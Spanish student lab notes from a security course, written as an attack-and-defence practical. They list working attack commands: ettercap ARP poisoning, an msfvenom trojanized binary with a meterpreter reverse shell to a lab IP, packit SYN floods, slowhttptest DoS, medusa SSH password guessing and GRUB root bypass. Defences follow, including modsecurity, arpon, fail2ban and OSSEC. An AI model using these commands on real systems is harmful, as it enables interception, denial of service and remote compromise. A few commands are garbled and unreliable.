# PRÁCTICA 2 - EJEMPLOS DE CATEGORÍAS DE ATAQUE ET AL

- ettercap-text-only / ettercap-graphical

### ettercap 
- # ettercap -P repoison-arp -M arp:remote

-M arp es para interceptar el tráfico únicamente entre dos máquinas.
:remote indica que coja el tráfico entre dos máquinas 
pero también el tráfico que venga de Internet (del router)
:oneway solo intercepto el tráfico que va de la máquina hacia fuera, 
no el que le llega

-M port :remote/:tree
-M dhcp: 10.11.49.106-Y/255.255.254.0/10.8.12.49
-M icmp xx:_____:xx/X.X.X.X ___________ /_____// /_____//
-M ndp
-M arp:remote /10.11.49.106// /10.11.48.1//

### [IMPORTANTE] Entre qué máquinas me voy a meter:

Solo de una IP al router, o de una IP a otra IP

/10.11.49.106//    /10.11.48.1


### [IMPORTANTE] Para salir de ettercap;

Se sale con la letra q, nunca con Ctrl+C

##########

-w ficherito

##### probar WIRESHARK

1. ssh -X lsi@10.11.48.50 (carga las ventanas gráficas en la máquina personal)

2. probarlo en nuestra máquina personal

#####

ping -b 10.11.49.255
arp -a
# debian no acepta ping a direcciones de broadcast
## Solución: hacer un script con un for para hacer ping a todas las direcciones
## Solución2: nmap -sP 10.11.48/23

#####
atk6-alive6 (ping6 ff02::1)

#### apartado e)
analizar tráfico ens33
pcap

#### apartado f)
ettercap -P remote_browser

#### apartado g)

1. instalar metasploit

2. ponerlo a funcionar (crear bbdd... (seguir how-to))

3. crear un binario ejecutable troyanizado para que si alguien lo ejecute, lance un shell contra el metasploit. Payload meterpreter

##### msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.11.48.50 lport=1234 -f elf -o navigate3.0
chmod +x navigate3.0
ejecutable para linux con un reverse tcp de meterpreter


wget -r -k http:// comando para descargar un servidor web (info estática)

-l2 descarga dos niveles (index y siguiente nivel de página)

crappling

-H descargaría las páginas de ese server y a su vez las páginas que enlaza de otros servidores

hacerse root en una maquina a traves del grub desprotegido

rw init=/bin/sh

como proteger el grub?

grub-mkpasswd-pbkdf2 -> genera hash

/etc/grub.d/40_custom

set superuser=root

password_pbkdf2 root [pegar hash]

TEMPEST - ejercito se gasta millones en estas herramientas tempest

rebailling y reflow - el primero es resoldar un chip y el reflow es darle calor a la circuiteria

KRACK

krack attack contra wpa2

wpa3 aparece y se estandariza en 2018

ataques dragon blood contra wpa3

wpa3:

algoritmo SAE autenticacion simultanea entre iguales

algoritmo diffie-hellman CE (dragonfly se basa en él)


---------------- 

borrado seguro de información

srm - secure remove

shred 

wipe

eraser - borrado seguro para windows

dd if=/dev/unrandom if=/dev/sdb

sfill 

sswap

smem

arp -s x.x.x.x xx:xx:xx:xx
  · se define que ARP sólo funcione con una máquina e IP
  
arp -f fichero
  · Fija las IP y MAC

/etc/ethers: se usa para fijar la relación entre IPs y MACs


apt install arpon -> gestiona la tabla ARP 
/etc/arpon.conf
 --sarpi
Static ARP: misma IP - MAC

systemctl start arpon@ens33

1. Instalar arpon
2. arp -a (IP y MAC router)
3. Compañero lanza ettercap
4. arp -a (la IP del router apunta a la MAC del compañero: arpon no protege)
Si arpon protege, la MAC del router no cambia

/var/log/arpon.log

NO ACTIVAR EN BOTADO


iftop -i ens33
nethops

vnstat -l -u -i ens33
vnstat -u -i ens33 (recolecta información)
  Después: vnstat --days, vnstat --weeks, vnstat --months


packit -c 0 -b 0 -s 10.11.48.13 -d 10.11.48.21 -F s -s 1000 -D 80
 - Inyectar paquetes sin parar: SYN flood
 - Puerto 80 para que el firewall lo permita
 - Poniendo -s 22, el puerto origen será 22, por lo que volvería al puerto 22
 
 
packit -c 0 -b 0 -sR -d 10.11.48.21 -F s -s 1000 -D 80
 - Direcciones random, responde a direcciones aleatorias
 
 
Floodeo directo: se inyectan los paquetes directos a la máquina que se quiere floodear
Floodeo reflectivo: la dirección origen se establece en la que se quiere floodear


Tirar abajo todas las máquinas del segmento:
algo ipv6...


Tirar abajo un servidor http (contra el del compañero)

apt install apache2

Abren conexiones contra el servidor web
Se busca cómo hacerle el máximo daño, lo que más requiera
Se ejecutan ese tipo de peticiones
Ejemplo: POST lentos de gran cantidad

slowhttptest -c 1000 -g -X -o fichero -r 200 -w 512 -y
  - 1000 conexiones
  - -g: genera un chart
  - -X: tipo de ataque
  - Ventana entre 200 y 512 
apt install slow httptest



WAF - modsecurity
apt install libapache2-mod-security2 
systemctl restart apache2.service

sites available: módulos existentes, instalados
sites enable: los que se ejecutan
... con sus directorios con archivos de configuración

e2enmod  <MÓDULO> -> habilita
a2dismod <MÓDULO> -> deshabilita, lo quita de sites enable


Inicialmente no funciona

Probaremos para comprobar que protege del ataque de DoS

cp /etc/modsecurity.conf-recommended /etc/modsecurity.conf

secruleengine: en detection-only, los detecta pero no hace nada (/var/log/apache2/modsec_audit.log)
               on -> funcionará con las reglas establecidas, y defiende

Activándolo en el fichero de configuración, se carga esa configuración en todos los sites. Para hacerlo más específicamente, se pone en el directorio de sites enable.


SecRuleEngine on en el general
SecConEngine on -> limita conexiones. Después se puede añadir SecWrite, SecRead con un número




whatweb: fingerprinting de un servidor web. Protegido con modsecurity
nessus


nmap
port scanning y fingerprinting de lo que tiene abierto y el SO

Direccionamiento IP4 UDC, IPs servidores email y DNS
Transferencia de zona del DNS de la UDC
 - El servidor de zona no deja
 - Resolución inversa: nmap -sL, dnsenum
 - 


Implementar ataque password guessing
medusa -h 10.11.48.50 -u lsi -P <DICCIONARIO> -M ssh -f
 - Se pueden añadir ficheros con IPs, nombres de usuario, etc.
 - 


No abrir conexiones ssh como root /etc/sshd.conf


fail2ban: defiende de los ataques de password guessing a ssh o cualquier otro servicio
ossec: HIPS (Host IPS)
 - Detecta ataques a partir de la información de log
 - Servidor
 - Agente: notifican cosas al servidor
 - Local: sobre los logs de la propia máquina
 - emails a lsi@localhost
 - Servidor de integridad: sí
 - rootki: sí
 - respuesta activa: sí IPS/IDS
 - Desechar en firewall: sí (lanza reglas en firewall) 

Traer tráfico ens33 en ficheros pk
